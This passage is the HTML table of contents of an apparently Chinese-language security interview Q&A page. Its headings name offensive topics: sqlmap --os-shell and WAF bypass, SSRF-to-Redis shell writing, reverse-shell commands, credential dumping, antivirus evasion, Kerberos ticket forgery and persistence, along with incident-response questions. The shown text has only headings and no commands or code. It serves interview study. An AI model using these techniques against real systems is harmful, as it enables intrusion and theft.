href="#%E5%A6%82%E4%BD%95%E7%AA%81%E7%A0%B4%E6%B3%A8%E5%85%A5%E6%97%B6%E5%AD%97%E7%AC%A6%E8%A2%AB%E8%BD%AC%E4%B9%89"><span class="toc-number">2.1.12.</span> <span class="toc-text">如何突破注入时字符被转义？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sqlmap%E8%87%AA%E5%B8%A6%E8%84%9A%E6%9C%AC%E4%BD%A0%E7%9F%A5%E9%81%93%E5%93%AA%E4%BA%9B"><span class="toc-number">2.1.13.</span> <span class="toc-text">sqlmap自带脚本你知道哪些</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sqlmap%E4%B8%ADos-shell%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="toc-number">2.1.14.</span> <span class="toc-text">sqlmap中–os-shell的原理及利用条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#xp_cmdshell%E6%9C%89%E4%BB%80%E4%B9%88%E9%99%90%E5%88%B6"><span class="toc-number">2.1.15.</span> <span class="toc-text">xp_cmdshell有什么限制？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sqlmap%E5%A6%82%E4%BD%95%E5%88%A4%E6%96%AD%E4%B8%80%E4%B8%AA%E7%BD%91%E7%AB%99%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.1.16.</span> <span class="toc-text">sqlmap如何判断一个网站是否存在sql注入漏洞？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sqlmap%E5%A6%82%E4%BD%95%E5%88%97%E5%87%BA%E6%95%B0%E6%8D%AE%E5%BA%93%E8%A1%A8%E5%92%8C%E5%AD%97%E6%AE%B5"><span class="toc-number">2.1.17.</span> <span class="toc-text">sqlmap如何列出数据库，表和字段？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sqlmap%E5%A6%82%E4%BD%95%E6%89%A7%E8%A1%8C%E4%BB%BB%E6%84%8Fsql%E8%AF%AD%E5%8F%A5%E5%92%8C%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4"><span class="toc-number">2.1.18.</span> <span class="toc-text">sqlmap如何执行任意sql语句和系统命令？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sqlmap%E5%A6%82%E4%BD%95%E7%BB%95%E8%BF%87waf%E5%92%8C%E9%98%B2%E7%81%AB%E5%A2%99"><span class="toc-number">2.1.19.</span> <span class="toc-text">sqlmap如何绕过waf和防火墙？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%BE%E5%88%B0%E4%B8%80%E4%B8%AA%E6%B3%A8%E5%85%A5%E7%82%B9%E6%80%8E%E4%B9%88%E5%88%A4%E6%96%AD%E5%AF%B9%E6%96%B9%E4%BB%80%E4%B9%88%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-number">2.1.20.</span> <span class="toc-text">找到一个注入点怎么判断对方什么数据库</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#access%E6%89%AB%E5%87%BA%E5%90%8E%E7%BC%80%E4%B8%BAasp%E7%9A%84%E6%95%B0%E6%8D%AE%E5%BA%93%E6%96%87%E4%BB%B6%E8%AE%BF%E9%97%AE%E4%B9%B1%E7%A0%81-%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0%E5%88%B0%E6%9C%AC%E5%9C%B0%E5%88%A9%E7%94%A8"><span class="toc-number">2.1.21.</span> <span class="toc-text">access扫出后缀为asp的数据库文件，访问乱码。如何实现到本地利用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#xsscorsjsonpcsp"><span class="toc-number">2.2.</span> <span class="toc-text">XSS&#x2F;CORS&#x2F;JSONP&#x2F;CSP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BE%93%E5%87%BA%E5%88%B0href%E7%9A%84xss%E5%A6%82%E4%BD%95%E9%98%B2%E5%BE%A1"><span class="toc-number">2.2.1.</span> <span class="toc-text">输出到href的XSS如何防御</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#xss%E7%9A%84%E9%98%B2%E6%8A%A4%E6%96%B9%E6%B3%95%E6%9C%89%E5%93%AA%E4%BA%9Bhttponly%E5%A6%82%E4%BD%95%E7%BB%95%E8%BF%87"><span class="toc-number">2.2.2.</span> <span class="toc-text">XSS的防护方法有哪些？httponly如何绕过？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#csrfssrfxxe"><span class="toc-number">2.3.</span> <span class="toc-text">CSRF&#x2F;SSRF&#x2F;XXE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#csrf%E4%B8%8Exss%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-number">2.3.1.</span> <span class="toc-text">CSRF与XSS的区别</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#samesite%E9%98%B2%E5%BE%A1csrf%E7%9A%84%E5%8E%9F%E7%90%86"><span class="toc-number">2.3.2.</span> <span class="toc-text">samesite防御CSRF的原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#xxe%E7%9A%84%E5%8D%B1%E5%AE%B3%E5%93%AA%E4%BA%9B%E5%9C%B0%E6%96%B9%E5%AE%B9%E6%98%93%E5%AD%98%E5%9C%A8xxexxe%E6%9E%B6%E6%9E%84%E6%96%B9%E9%9D%A2%E6%9C%89%E6%B2%A1%E6%9C%89%E4%BA%86%E8%A7%A3%E8%BF%87"><span class="toc-number">2.3.3.</span> <span class="toc-text">XXE的危害？哪些地方容易存在xxe？xxe架构方面有没有了解过？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ssrf%E6%80%8E%E4%B9%88%E7%94%A8redis%E5%86%99shell"><span class="toc-number">2.3.4.</span> <span class="toc-text">ssrf怎么用redis写shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#json%E6%A0%BC%E5%BC%8F%E7%9A%84csrf%E5%A6%82%E4%BD%95%E9%98%B2%E5%BE%A1"><span class="toc-number">2.3.5.</span> <span class="toc-text">json格式的CSRF如何防御</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A"><span class="toc-number">2.4.</span> <span class="toc-text">文件包含&#x2F;文件上传&#x2F;目录遍历&#x2F;目录穿越</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABgetshell%E6%80%9D%E8%B7%AF"><span class="toc-number">2.4.1.</span> <span class="toc-text">文件包含getshell思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#php%E7%9A%8400%E6%88%AA%E6%96%AD%E7%9A%84%E5%8E%9F%E7%90%86%E6%98%AF%E4%BB%80%E4%B9%88"><span class="toc-number">2.4.2.</span> <span class="toc-text">php的%00截断的原理是什么？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#php%E7%9A%84lfi%E6%9C%AC%E5%9C%B0%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E6%98%AF%E4%BB%80%E4%B9%88%E5%86%99%E4%B8%80%E6%AE%B5%E5%B8%A6%E6%9C%89%E6%BC%8F%E6%B4%9E%E7%9A%84%E4%BB%A3%E7%A0%81-%E6%89%8B%E5%B7%A5%E7%9A%84%E8%AF%9D%E5%A6%82%E4%BD%95%E5%8F%91%E6%8E%98%E5%A6%82%E6%9E%9C%E6%97%A0%E6%8A%A5%E9%94%99%E5%9B%9E%E6%98%BE%E4%BD%A0%E6%98%AF%E6%80%8E%E4%B9%88%E9%81%8D%E5%8E%86%E6%96%87%E4%BB%B6%E7%9A%84"><span class="toc-number">2.4.3.</span> <span class="toc-text">php的LFI（本地包含漏洞）原理是什么？写一段带有漏洞的代码。手工的话如何发掘？如果无报错回显，你是怎么遍历文件的？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.5.</span> <span class="toc-text">反序列化漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#php"><span class="toc-number">2.5.1.</span> <span class="toc-text">PHP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#java"><span class="toc-number">2.5.2.</span> <span class="toc-text">JAVA</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B6%E4%BB%96-2"><span class="toc-number">2.6.</span> <span class="toc-text">其他</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ddos%E6%94%BB%E5%87%BB"><span class="toc-number">2.6.1.</span> <span class="toc-text">DDoS攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web%E5%85%B8%E5%9E%8B%E6%BC%8F%E6%B4%9E%E6%9C%89"><span class="toc-number">2.6.2.</span> <span class="toc-text">WEB典型漏洞有</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B8%97%E9%80%8F%E6%B5%81%E7%A8%8B"><span class="toc-number">3.</span> <span class="toc-text">渗透流程</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">3.1.</span> <span class="toc-text">信息搜集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%90%9C%E9%9B%86%E6%B3%A8%E5%86%8C%E4%BA%BA%E9%82%AE%E7%AE%B1%E6%9C%89%E4%BB%80%E4%B9%88%E4%BB%B7%E5%80%BC"><span class="toc-number">3.1.1.</span> <span class="toc-text">搜集注册人邮箱有什么价值</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%9F%E5%90%8D%E6%B3%9B%E8%A7%A3%E6%9E%90%E6%80%8E%E4%B9%88%E5%A4%84%E7%90%86"><span class="toc-number">3.1.2.</span> <span class="toc-text">域名泛解析怎么处理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#cdn%E6%98%AF%E4%BB%80%E4%B9%88"><span class="toc-number">3.1.3.</span> <span class="toc-text">CDN是什么</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#cdn%E6%80%8E%E4%B9%88%E5%88%A4%E6%96%AD"><span class="toc-number">3.1.4.</span> <span class="toc-text">CDN怎么判断</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E7%BB%95%E8%BF%87cdn"><span class="toc-number">3.1.5.</span> <span class="toc-text">如何绕过CDN</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#phpinfo%E4%BD%A0%E4%BC%9A%E5%85%B3%E6%B3%A8%E5%93%AA%E4%BA%9B%E4%BF%A1%E6%81%AF"><span class="toc-number">3.1.6.</span> <span class="toc-text">phpinfo你会关注哪些信息</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF"><span class="toc-number">3.2.</span> <span class="toc-text">渗透思路</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%89%E4%B8%80%E4%B8%AA%E7%99%BB%E5%BD%95%E6%A1%86%E4%BD%A0%E7%9A%84%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E6%98%AF%E4%BB%80%E4%B9%88"><span class="toc-number">3.2.1.</span> <span class="toc-text">有一个登录框，你的渗透思路是什么？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E6%89%8B%E5%B7%A5%E5%88%A4%E6%96%AD%E5%AF%B9%E6%96%B9%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F"><span class="toc-number">3.2.2.</span> <span class="toc-text">如何手工判断对方操作系统？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%99%E4%BD%A0%E4%B8%80%E4%B8%AA%E7%9B%AE%E6%A0%87%E5%A6%82%E4%BD%95%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95"><span class="toc-number">3.2.3.</span> <span class="toc-text">给你一个目标，如何进行渗透测试</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%99%E4%BD%A0%E4%B8%80%E4%B8%AA%E7%BD%91%E7%AB%99%E4%BD%A0%E5%A6%82%E4%BD%95%E5%88%A4%E6%96%AD%E6%A1%86%E6%9E%B6struts2-shiro-springboot"><span class="toc-number">3.2.4.</span> <span class="toc-text">给你一个网站，你如何判断框架（struts2、shiro、springboot）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7"><span class="toc-number">3.3.</span> <span class="toc-text">渗透技巧</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8waf%E7%BB%95%E8%BF%87%E6%89%8B%E6%B3%95"><span class="toc-number">3.3.1.</span> <span class="toc-text">常用WAF绕过手法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4"><span class="toc-number">3.3.2.</span> <span class="toc-text">反弹shell的常用命令</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F"><span class="toc-number">4.</span> <span class="toc-text">内网渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF"><span class="toc-number">4.1.</span> <span class="toc-text">思路</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF"><span class="toc-number">4.1.1.</span> <span class="toc-text">内网渗透思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E6%8A%93%E5%8F%96%E5%AF%86%E7%A0%81%E5%A6%82%E4%BD%95%E6%8A%93"><span class="toc-number">4.1.2.</span> <span class="toc-text">内网抓取密码如何抓</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%BB%80%E4%B9%88%E7%89%88%E6%9C%AC%E4%B9%8B%E5%90%8E%E6%8A%93%E4%B8%8D%E5%88%B0%E5%AF%86%E7%A0%81%E6%8A%93%E4%B8%8D%E5%88%B0%E6%80%8E%E4%B9%88%E5%8A%9E"><span class="toc-number">4.1.3.</span> <span class="toc-text">操作系统什么版本之后抓不到密码？抓不到怎么办</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E5%85%8D%E6%9D%80%E4%BA%86%E8%A7%A3%E8%BF%87%E5%90%97%E6%9C%89%E5%93%AA%E4%BA%9B%E6%96%B9%E6%B3%95"><span class="toc-number">4.1.4.</span> <span class="toc-text">内网免杀了解过吗？有哪些方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E6%9E%9C%E6%8B%BF%E5%88%B0%E5%9F%9F%E6%8E%A7%E5%A6%82%E4%BD%95%E6%89%B9%E9%87%8F%E5%88%A4%E6%96%AD%E5%93%AA%E4%B8%AA%E4%B8%BB%E6%9C%BA%E6%98%AF%E5%87%BA%E7%BD%91%E7%9A%84%E5%93%AA%E4%B8%AA%E6%98%AF%E4%B8%8D%E5%87%BA%E7%BD%91"><span class="toc-number">4.1.5.</span> <span class="toc-text">如果拿到域控，如何批量判断哪个主机是出网的，哪个是不出网？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%BC%E5%90%88"><span class="toc-number">4.2.</span> <span class="toc-text">综合</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%9F%E4%BF%A1%E6%81%AF%E7%9A%84%E6%90%9C%E9%9B%86%E6%80%9D%E8%B7%AF"><span class="toc-number">4.2.1.</span> <span class="toc-text">域信息的搜集思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E7%9A%84%E6%9C%89%E4%BB%80%E4%B9%88%E5%B7%A5%E5%85%B7"><span class="toc-number">4.2.2.</span> <span class="toc-text">常见的有什么工具</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F"><span class="toc-number">4.3.</span> <span class="toc-text">横向渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#kerberos%E5%8D%8F%E8%AE%AE%E7%9A%84%E6%B5%81%E7%A8%8B"><span class="toc-number">4.3.1.</span> <span class="toc-text">Kerberos协议的流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#kerberos%E6%9C%89%E4%BB%80%E4%B9%88%E6%BC%8F%E6%B4%9E"><span class="toc-number">4.3.2.</span> <span class="toc-text">Kerberos有什么漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ptt-pth-ptk%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-number">4.3.3.</span> <span class="toc-text">PTT、PTH、PTK的区别</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A8%AA%E5%90%91%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%89%8B%E6%AE%B5"><span class="toc-number">4.3.4.</span> <span class="toc-text">横向命令执行手段</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#psexec%E5%92%8Cwimc%E6%88%96%E8%80%85%E5%85%B6%E4%BB%96%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-number">4.3.5.</span> <span class="toc-text">psexec和wimc或者其他的区别</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E4%B8%8E%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81"><span class="toc-number">4.4.</span> <span class="toc-text">权限提升与权限维持</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83"><span class="toc-number">4.4.1.</span> <span class="toc-text">数据库提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#windows%E6%8F%90%E6%9D%83%E6%80%9D%E8%B7%AF"><span class="toc-number">4.4.2.</span> <span class="toc-text">windows提权思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#linux%E6%8F%90%E6%9D%83%E6%80%9D%E8%B7%AF"><span class="toc-number">4.4.3.</span> <span class="toc-text">linux提权思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE-%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE"><span class="toc-number">4.4.4.</span> <span class="toc-text">什么是黄金票据、白银票据</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9A%A7%E9%81%93%E4%BB%A3%E7%90%86"><span class="toc-number">4.5.</span> <span class="toc-text">隧道代理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%AE%E6%A0%87%E6%9C%BA%E5%99%A8ping%E4%B8%8D%E9%80%9A%E5%A4%96%E7%BD%91%E6%B2%A1%E6%9C%89%E5%8A%9E%E6%B3%95%E8%B5%B0%E7%BD%91%E7%BB%9C%E5%B1%82%E5%8D%8F%E8%AE%AE%E5%A6%82%E4%BD%95%E6%90%AD%E5%BB%BA%E9%9A%A7%E9%81%93"><span class="toc-number">4.5.1.</span> <span class="toc-text">目标机器ping不通外网，没有办法走网络层协议，如何搭建隧道</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%AD%A3%E5%90%91%E4%BB%A3%E7%90%86%E4%B8%8E%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-number">4.5.2.</span> <span class="toc-text">正向代理与反向代理的区别</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E7%9A%84%E5%A4%9A%E7%BA%A7%E4%BB%A3%E7%90%86%E7%94%A8%E4%BB%80%E4%B9%88%E8%BF%9B%E8%A1%8C%E4%BB%A3%E7%90%86"><span class="toc-number">4.5.3.</span> <span class="toc-text">内网的多级代理用什么进行代理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E6%9E%9Ctcp%E5%92%8Cudp%E4%B8%8D%E5%87%BA%E7%BD%91%E7%94%A8%E4%BB%80%E4%B9%88%E7%AD%96%E7%95%A5%E8%BF%9B%E8%A1%8C%E4%BB%A3%E7%90%86%E6%90%AD%E5%BB%BA"><span class="toc-number">4.5.4.</span> <span class="toc-text">如果tcp和udp不出网，用什么策略进行代理搭建</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%9F%E7%9B%B8%E5%85%B3"><span class="toc-number">4.6.</span> <span class="toc-text">域相关</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%9F%E5%86%85%E6%94%BB%E5%87%BB%E6%9C%89%E4%BB%80%E4%B9%88%E6%96%B9%E6%B3%95"><span class="toc-number">4.6.1.</span> <span class="toc-text">域内攻击有什么方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%B4%E4%B8%80%E4%B8%8B%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB"><span class="toc-number">4.6.2.</span> <span class="toc-text">说一下委派攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE"><span class="toc-number">4.6.2.1.</span> <span class="toc-text">非约束委派</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE"><span class="toc-number">4.6.2.2.</span> <span class="toc-text">约束委派</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB"><span class="toc-number">4.6.2.3.</span> <span class="toc-text">基于资源的约束委派攻击</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%9F%9F%E6%8E%A7%E6%9D%83%E9%99%90%E7%9A%84%E6%96%B9%E6%B3%95"><span class="toc-number">4.6.3.</span> <span class="toc-text">获取域控权限的方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E5%AE%9A%E4%BD%8D%E5%9F%9F%E6%8E%A7"><span class="toc-number">4.6.4.</span> <span class="toc-text">如何定位域控</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%92%8C%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE%E8%AF%B4%E4%B8%80%E4%B8%8B"><span class="toc-number">4.6.5.</span> <span class="toc-text">黄金票据和白银票据说一下？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%8E%E4%B9%88%E5%81%9A"><span class="toc-number">4.6.6.</span> <span class="toc-text">权限维持怎么做</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E4%B8%8E%E5%B7%A5%E5%85%B7"><span class="toc-number">4.7.</span> <span class="toc-text">命令与工具</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A3%E7%90%86%E8%BD%AC%E5%8F%91%E5%B7%A5%E5%85%B7%E6%9C%89%E4%BB%80%E4%B9%88"><span class="toc-number">4.7.1.</span> <span class="toc-text">代理转发工具有什么</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E8%BF%9B%E7%A8%8B%E5%91%BD%E4%BB%A4"><span class="toc-number">4.7.2.</span> <span class="toc-text">查看进程命令</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E4%B8%8E%E6%BA%AF%E6%BA%90"><span class="toc-number">5.</span> <span class="toc-text">应急响应与溯源</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E7%9A%84%E7%AE%80%E5%8D%95%E6%B5%81%E7%A8%8B"><span class="toc-number">5.1.</span> <span class="toc-text">应急响应的简单流程？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#windowslinux%E8%A2%AB%E6%8F%92%E5%85%A5%E5%90%8E%E9%97%A8%E6%96%87%E4%BB%B6%E5%A6%82%E4%BD%95%E6%8E%92%E6%9F%A5"><span class="toc-number">5.2.</span> <span class="toc-text">Windows&#x2F;Linux被插入后门文件，如何排查</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E5%91%8A%E8%AD%A6%E5%BA%94%E8%AF%A5%E5%A6%82%E4%BD%95%E5%A4%84%E7%90%86%E6%B5%81%E7%A8%8B%E6%98%AF%E6%80%8E%E4%B9%88%E6%A0%B7%E7%9A%84"><span class="toc-number">5.3.</span> <span class="toc-text">内网告警应该如何处理，流程是怎么样的？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%98%B2%E7%81%AB%E5%A2%99%E6%80%8E%E6%A0%B7%E5%88%A4%E6%96%AD%E8%BF%99%E6%98%AF%E4%B8%80%E4%B8%AA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="toc-number">5.4.</span> <span class="toc-text">防火墙怎样判断这是一个反序列化漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%A6%82%E4%BD%95%E6%9F%A5%E6%89%BE%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%E5%A6%82%E4%BD%95%E9%80%9A%E8%BF%87%E8%BF%9B%E7%A8%8B%E6%89%BE%E5%88%B0%E6%8C%96%E7%9F%BF%E6%96%87%E4%BB%B6"><span class="toc-number">5.5.</span> <span class="toc-text">应急响应如何查找挖矿病毒，如何通过进程找到挖矿文件？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#webshell%E6%B5%81%E9%87%8F%E4%BA%A4%E4%BA%92%E7%9A%84%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81"><span class="toc-number">5.6.</span> <span class="toc-text">Webshell流量交互的流量特征?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5%E5%BC%82%E5%B8%B8%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E6%80%9D%E8%B7%AF"><span class="toc-number">5.7.</span> <span class="toc-text">SQL注入异常流量分析思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%81%87%E8%AE%BE%E5%8F%91%E7%8E%B0web%E5%BA%94%E7%94%A8%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%8F%91%E7%8E%B0%E6%96%87%E4%BB%B6%E5%BC%82%E5%B8%B8%E5%A2%9E%E5%A4%9A%E5%88%9D%E6%AD%A5%E6%80%80%E7%96%91%E8%A2%AB%E4%B8%8A%E4%BC%A0webshell%E6%8F%8F%E8%BF%B0%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E6%BA%AF%E6%BA%90%E7%9A%84%E6%80%9D%E8%B7%AF"><span class="toc-number">5.8.</span> <span class="toc-text">假设发现web应用服务器发现文件异常增多，初步怀疑被上传webshell，描述流量分析溯源的思路?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sftptelnetssh%E7%9A%84%E7%AB%AF%E5%8F%A3%E5%8F%B7ssh%E4%B8%8Etelnet%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-number">5.9.</span> <span class="toc-text">sftp，telnet，ssh的端口号？ssh与telnet的区别？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8C%96%E7%9F%BF%E6%9C%89%E4%BA%86%E8%A7%A3%E5%90%97"><span class="toc-number">5.10.</span> <span class="toc-text">挖矿有了解吗？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E7%9A%84%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87%E6%9C%89%E4%BB%80%E4%B9%88"><span class="toc-number">5.11.</span> <span class="toc-text">常见的安全设备有什么</span></a></li><li class="toc-item 